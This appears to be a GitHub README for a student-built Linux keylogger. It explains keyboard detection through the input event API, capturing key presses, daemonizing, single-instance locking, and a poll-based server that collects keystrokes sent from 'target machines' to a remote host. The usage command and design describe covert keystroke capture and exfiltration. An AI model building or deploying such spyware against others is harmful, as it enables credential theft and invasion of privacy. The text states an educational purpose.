<H2> Table of contents </H2>
<ul>
    <li><a href="#-compiling-">Compiling</a></li>
    <li><a href="#Running">Running</a></li>
    <li><a href="#Finding">Looking for keyboard device</a></li>
    <li><a href="#Reading">Reading keyboard events</a></li>
    <li><a href="#Termination">Termination</a></li>
    <li><a href="#Daemonize">Daemonizing process</a></li>
    <li><a href="#Single">Single instance daemon and file locking</a></li>
    <li><a href="#Server">Server</a></li>
  <li><a href="#References">References</a></li>
  <li><a href="#Disclaimer">Disclaimer</a></li>
</ul>

<H3 id="Compiling"> Compiling </H3>

```c
make
```
<H3 id="Running"> Running </H3>

Synopsis:
 <code><b>./keylogger</b> <b>host</b> <b>port</b></code>
<ul>
  <li><b>host</b>: server hostname or ipv4 address</li>
  <li><b>port</b>: server port</li> 
</ul>
Running example (on target machine): <code>sudo ./keylogger &lt;server-ip&gt; 12345</code><br>
Running example (on host machine): <code>./server</code>

<H3 id="Finding"> Looking for keyboard device </H3>

On Unix-based systems, devices are typically found in the `/dev/input/` directory. The function `int keyboardFound(char *path, int *keyboard_fd)` located in [keylogger.c](/keylogger.c) is responsible for iterating over all files of `/dev/input/` and its subdirectories to locate the keyboard device. To minimize false positives, the function performs three checks on each device:

1. **Check for keys support**: The device must support keys, as keyboards are expected to have key functionality.

2. **Check for no relative and absolute movement support**: Merely checking if the device supports keys might not be sufficient, as other devices like gaming mices and joysticks also have keys.

3. **Check for common keyboard keys support**: Although the first two checks help filter potential keyboards, there may still be false positives. For example, the power button is a device that supports keys, doesn't have relative and absolute movement support, but has one key (the key to power on and off the host device). To conclusively verify that the device is indeed a keyboard, a function examines whether it supports some common keyboard keys. A selection of twelve commonly used keys, such as *'KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC'*, is used for this purpose.

To do so the *event API (`EVIOC* functions`)* is used and will allow us to query the capabilities and characteristics of an input device. The following function uses the linux event API to check whether or not an input device support specific input events:
```c
int hasEventTypes(int fd, unsigned long evbit_to_check)
{
    unsigned long evbit = 0;

    /* Get the bit field of available event types. */
    ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);

    /* Check if EV_* set in $evbit_to_check are set. */
    return ((evbit & evbit_to_check) == evbit_to_check);
}
```

```c
/* Returns true iff the given device supports keys. */
int hasKeys(int fd)
{
    return hasEventTypes(fd, (1 << EV_KEY));
}
```
Function `hasEventTypes` takes two inputs: the file descriptor of the device and a bitmask representing the event types to be checked. The `ioctl` system call, using the `EVIOCGBIT` macro, populates the `evbit` bitmask, where each bit corresponds to a supported event type by the device. Subsequently, a bitwise AND operation is performed between the `evbit` bitmask (containing all supported event types by the device) and the `evbit_to_check` bitmask (representing the event types to be checked). If the result of this operation exactly matches the `evbit_to_check` bitmask, it indicates that the device supports the specified event types.
As an example, let's illustrate the function's usage using a file descriptor for a gaming mouse. Suppose the gaming mouse has the `EV_KEY`, `EV_REL`, and `EV_LED` event type bits set, and we want to check if the current device supports `EV_KEY` and `EV_REL` (i.e., it is a gaming mouse). 

1. The hasEventTypes(fd, evbit_to_check) is called with fd being the descriptor of the gaming mouse and `evbit_to_check` is a bitmask representing `EV_KEY` and `EV_REL`, obtained by OR-ing the bitmasks associated with these two event types: `evbit_to_check = (1 << EV_KEY) | (1 << EV_REL) = 0000...000010 | 0000...000100 = 0000...000110`. The left shift operator << moves bit 1 EV_X positions to the left, starting from 0.

2. The `ioctl()` system call retrieves the supported event types and fills the `evbit` bitmask. Only three bits will be high in this bitmask: the second bit for the `EV_KEY` event type (as `EV_KEY` has a constant value of 1), the third bit for the `EV_REL` event type (as `EV_REL` has a constant value of 2), and the eleventh bit for the `EV_LED` event type (as `EV_LED` has a constant value of 11). So, the `evbit` bitmask in binary would be `00000..100000000110`.

3. Finally, we perform the bitwise AND operation between `evbit` and `evbit_to_check`, resulting in `evbit & evbit_to_check = 00000..100000000110 & 0000...000000000110 = 0000...000000000110 = evbit_to_check`. This indicates that the device supports key events and relative movement since both `EV_KEY` and `EV_REL` bits are set in the `evbit` bitmask.

<H3 id="Reading"> Reading keyboard events </H3>

To retrieve events from a device, you need to use the standard character device "read" function. Each time you read from an event device, you will receive a set of events. Each event is represented by a `struct input_event`. If you want to learn more about the fields in the input_event structure, you can refer to the documentation at https://www.kernel.org/doc/Documentation/input/event-codes.txt.
```c
struct input_event {
      struct timeval time;
      unsigned short type;
      unsigned short code;
      unsigned int value; 
      };
```

When attempting to read from the keyboard device, you might not receive exactly what you expect, which is a single event containing the code of the key you just pressed. This discrepancy occurs because, in general, a single hardware event is translated into multiple "software" input events. Let's consider what happens when I read from the keyboard device after pressing the letter "a":

![image](https://user-images.githubusercontent.com/75443422/177127789-686ff558-e1cc-4a9d-85b2-ea77ba325387.png)

As you can see, a single key press has generated six input events. Let's take a look at each of those events:

1. **Type = 4:** Indicates an EV_MSC event, which, according to the documentation, is used to describe miscellaneous input data that does not fit into other types. From my understanding, it returns the "value" field as the device-specific scan code. Therefore, we are not particularly interested in it, as it might yield wrong key codes if the user remaps the keys. However, it could be useful to recognize which specific physical buttons are being pressed.

2. **Type = 1:** This is the event we are mostly interested in. It corresponds to type = **EV_KEY**, indicating that a key has either been pressed, released, or repeated. A value of 1 tells us that a key has been pressed, and code = "30" represents the KEY_A key, which is indeed the key I pressed.

3. **Type = 0:** Indicates an EV_SYN event, which is simply used to separate different hardware events.

The other three events generated are almost the same as the first three, and they are associated with the hardware event of "releasing a key." For instance, if you take a look at the fifth event, you can see that we have an EV_KEY event with value = 0, representing a key release, in this case, of the letter "a".

*In my program, only key press events will be captured, specifically events whose type = EV_KEY and value = 1.*

<H3 id="Termination">Termination</H4>
Keylogger process can terminate gracefully by receiving two signals:
<ul>
    <li>SIGTERM</li>
    <li>SIGPIPE (Shutting down Server)</li>
</ul>
<H3 id="Daemonize">Daemonizing process</H4>
The keylogger will operate in the background without direct user control. To achieve this, I have implemented the program as a daemon process. The process is converted into a daemon using the int daemonize() function. I have included comments in the code that explain each step necessary for daemonizing a process.

<H3 id="Single">Single instance daemon and file locking</H4>
The keylogger is designed to run as a single instance at any given time. To ensure this, the daemon creates a file named "keylogger-daemon.pid" and places a write lock on the entire file, also writing its own process ID (PID) into it. This mechanism prevents other processes from acquiring a write lock on the same file, resulting in failure, as another instance of the daemon already owns the lock. In other words, only one instance of the keylogger daemon can be running simultaneously.
The following function checks whether another instance of the daemon is already running. If not, it returns the locked file.

 
<H3 id="Server"> Server </H3>
It is a simple non-blocking single-threaded server which logs keypress events, to its standard output.
<H4 id="IO"> IO/Multiplexing with poll() </H4>
Read operations could potentially block indefinitely, especially when the client is not pressing any keys for an extended period. This behavior would cause our main thread to block, preventing it from accepting new clients and servicing other tasks. To address this issue, we take two key measures:

1. We mark the sockets as non-blocking. By doing so, the read operations on these sockets will not wait indefinitely for data, and if no data is available, the read will return immediately with an error indicating that no data is present.

2. We utilize the `poll` system call, which allows the thread to be notified by the kernel whenever specific events occur, such as when the socket becomes readable (in our case). This enables efficient handling of multiple connections without blocking the main thread.

When using the `poll` system call, once we have read all available data from the sockets, subsequent read attempts will not block but instead fail, and the `errno` will be set to `EWOULDBLOCK` or `EAGAIN`, indicating that there is no data to read. This enables the main thread to regain control and continue servicing other tasks and accepting new clients as needed. In this way, we ensure that the keylogger remains responsive even during idle periods on the client side.

<H4 id="Logging"> Logging events session example </H4>
Events are printed in this format : <b>"IP: &ltIP&gt - Time: &ltTIME_SEC&gt - Key: &ltKEY&gt"</b>.Let us look at an example of server receiving events from two clients:

![Immagine 2022-07-04 143610](https://user-images.githubusercontent.com/75443422/177177850-e8e5b965-5d3d-4c6c-8947-77abfc1cf9d7.png)

<H2 id="References"> References </H2>
<ul>
<li>About system calls, signals, daemon processes and other C programming stuff: https://www.amazon.com/Advanced-Programming-UNIX-Environment-3rd/dp/0321637739</li>
<li>About Linux input subsystem:
  <ul>
    <li>https://www.linuxjournal.com/article/6429</li>
    <li>https://www.linuxjournal.com/article/1080</li>
    <li>https://www.kernel.org/doc/Documentation/input/event-codes.txt</li>
    <li>https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h</li>
  </ul>
  <li>About poll system call: https://www.ibm.com/docs/en/i/7.2?topic=designs-using-poll-instead-select</li>
</ul>
<H2 id="Disclaimer"> Disclaimer </H2>
I have developed this program just to learn about the linux input subsystem and to put in practice notions I have acquired during the operating systems class. You shall not run this program on machines where you don't have permissions to log key presses!

